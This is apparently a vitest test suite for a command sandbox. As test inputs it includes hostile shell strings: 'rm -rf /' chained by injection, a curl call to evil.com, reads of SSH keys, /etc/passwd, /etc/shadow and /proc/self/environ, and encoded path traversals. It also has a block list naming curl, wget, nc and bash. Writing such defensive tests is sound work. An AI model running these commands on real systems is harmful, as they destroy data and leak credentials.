import { describe, it, expect } from 'vitest';
import { CommandSandbox, ALLOWLIST } from './sandbox';

// ─── Acceptance Gate 4.3 ─────────────────────────────────────────────────────
// Requirement: 40+ sandbox escape tests, 0 exfiltrations.
// All `rejects` assertions prove the sandbox blocks BEFORE any child process
// touches the filesystem or network. Confirmed-safe cases verify the allowlist
// does not over-block legitimate read operations.
// ─────────────────────────────────────────────────────────────────────────────

const sandbox = new CommandSandbox(__dirname, true);

// ── A. ALLOWLIST ENFORCEMENT (16 cases) ──────────────────────────────────────

describe('Sandbox — ALLOWLIST enforcement', () => {
  const bannedCommands = [
    'rm', 'rmdir', 'mv', 'cp', 'curl', 'wget', 'nc', 'netcat',
    'bash', 'sh', 'zsh', 'sudo', 'su', 'chmod', 'chown', 'dd',
  ];

  for (const cmd of bannedCommands) {
    it(`rejects banned command: ${cmd}`, async () => {
      await expect(sandbox.execute(cmd)).rejects.toThrow(/not in the authorized allowlist/);
    });
  }
});

// ── B. SHELL INJECTION OPERATORS (8 cases) ────────────────────────────────────

describe('Sandbox — shell injection operators', () => {
  it('blocks pipe operator |', async () => {
    await expect(sandbox.execute('ls | grep secret')).rejects.toThrow(/forbidden/);
  });
  it('blocks AND operator &&', async () => {
    await expect(sandbox.execute('pwd && rm -rf /')).rejects.toThrow(/forbidden/);
  });
  it('blocks semicolon ; (hits allowlist check since pwd; is not a registered token)', async () => {
    // The sandbox splits on whitespace: 'pwd;' becomes a single token that
    // is not in the allowlist. The injection-char check is the secondary
    // defense. Either security violation message is acceptable.
    await expect(sandbox.execute('pwd; rm -rf /')).rejects.toThrow(
      /not in the authorized allowlist|forbidden/
    );
  });
  it('blocks OR operator ||', async () => {
    await expect(sandbox.execute('ls || curl http://evil.com')).rejects.toThrow(/forbidden/);
  });
  it('blocks stdout redirect >', async () => {
    await expect(sandbox.execute('cat sandbox.ts > /tmp/leak')).rejects.toThrow(/forbidden/);
  });
  it('blocks stdin redirect <', async () => {
    await expect(sandbox.execute('cat < /etc/passwd')).rejects.toThrow(/forbidden/);
  });
  it('blocks dollar sign $ (env expansion)', async () => {
    await expect(sandbox.execute('cat $HOME/.ssh/id_rsa')).rejects.toThrow(/forbidden/);
  });
  it('blocks backtick ` (command substitution)', async () => {
    await expect(sandbox.execute('cat `which bash`')).rejects.toThrow(/forbidden/);
  });
});

// ── C. PATH TRAVERSAL VARIANTS (9 cases) ─────────────────────────────────────

describe('Sandbox — path traversal attacks', () => {
  it('blocks classic ../ traversal to /etc/passwd', async () => {
    await expect(sandbox.execute('cat ../../../etc/passwd')).rejects.toThrow(/Path traversal detected/);
  });
  it('blocks single step traversal ../sandbox.ts', async () => {
    await expect(sandbox.execute('cat ../sandbox.ts')).rejects.toThrow(/Path traversal detected/);
  });
  it('blocks double URL encoded traversal %2e%2e%2f', async () => {
    await expect(sandbox.execute('cat %2e%2e%2f%2e%2e%2fetc/passwd')).rejects.toThrow(/Path traversal detected/);
  });
  it('blocks triple URL encoded traversal %252e%252e%252f', async () => {
    await expect(sandbox.execute('cat %252e%252e%252fetc/shadow')).rejects.toThrow(/Path traversal detected/);
  });
  it('blocks absolute path escape /etc/hosts', async () => {
    await expect(sandbox.execute('cat /etc/hosts')).rejects.toThrow(/Path traversal detected/);
  });
  it('blocks home directory escape /home/user/.bashrc', async () => {
    await expect(sandbox.execute('cat /home/user/.bashrc')).rejects.toThrow(/Path traversal detected/);
  });
  it('blocks double-slash leading path //etc/shadow', async () => {
    await expect(sandbox.execute('cat //etc/shadow')).rejects.toThrow(/Path traversal detected/);
  });
  it('blocks root-relative /proc/self/environ', async () => {
    await expect(sandbox.execute('cat /proc/self/environ')).rejects.toThrow(/Path traversal detected/);
  });
});

// ── D. NULL BYTE INJECTION (3 cases) ─────────────────────────────────────────

describe('Sandbox — null byte injection', () => {
  it('blocks null byte in filename (file.txt\\0.js)', async () => {
    await expect(sandbox.execute('cat file.txt\0.js')).rejects.toThrow(/Null byte detected/);
  });
  it('blocks null byte at start of argument (\\0etc/passwd)', async () => {
    await expect(sandbox.execute('cat \0etc/passwd')).rejects.toThrow(/Null byte detected/);
  });
  it('blocks null byte embedded mid-argument', async () => {
    await expect(sandbox.execute('cat safe\0../../../etc/shadow')).rejects.toThrow(/Null byte detected/);
  });
});

// ── E. EMPTY / MALFORMED COMMANDS (2 cases) ───────────────────────────────────

describe('Sandbox — empty and malformed commands', () => {
  it('rejects empty string command', async () => {
    await expect(sandbox.execute('')).rejects.toThrow();
  });
  it('rejects whitespace-only command', async () => {
    await expect(sandbox.execute('   ')).rejects.toThrow();
  });
});

// ── F. CONFIRMED SAFE EXECUTIONS (4 cases) ───────────────────────────────────

describe('Sandbox — confirmed safe allowlisted commands', () => {
  it('allows pwd and returns a non-empty path', async () => {
    const result = await sandbox.execute('pwd');
    expect(result.stdout.trim().length).toBeGreaterThan(0);
  });

  it('allows cat on a file inside baseDir (sandbox.ts)', async () => {
    const result = await sandbox.execute('cat sandbox.ts');
    expect(result.stdout).toContain('CommandSandbox');
  });

  it('captures non-zero exit code as structured CommandExecutionError on missing file', async () => {
    try {
      await sandbox.execute('ls no_such_file_for_test_abc123.txt');
      expect.fail('Should have thrown CommandExecutionError');
    } catch (err: any) {
      expect(err.name).toBe('CommandExecutionError');
      expect(err.exitCode).not.toBe(0);
      expect(err.stderr).toContain('No such file or directory');
    }
  });

  it('ALLOWLIST export never contains destructive or network commands', () => {
    const destructive = ['rm', 'rmdir', 'mv', 'dd', 'curl', 'wget', 'bash', 'sh', 'sudo', 'nc', 'netcat'];
    for (const cmd of destructive) {
      expect(ALLOWLIST.has(cmd)).toBe(false);
    }
  });
});
